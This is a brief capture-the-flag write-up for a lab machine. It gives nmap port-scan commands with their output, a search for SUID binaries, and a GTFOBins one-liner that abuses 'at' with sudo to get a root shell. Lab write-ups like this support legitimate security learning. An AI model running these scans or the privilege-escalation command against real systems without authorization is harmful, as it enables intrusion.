1. Scanning

Nmap
#

We scan all the ports and tell it to report only those that are open.

> sudo nmap -sS -p- --open --min-rate 3000 -n -Pn -vvv 10.10.173.88 -oN nmap

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

#

> nmap -p22,80 -sVC 10.10.173.88 -oN ports

3. Privilege Escalation
#

Let’s look at Suid binaries:

find / -perm -u=s -type f 2>/dev/null

If we go to GTFOBins and search for this binary, we find –> At Binary GFOBins

echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null

We are already root.
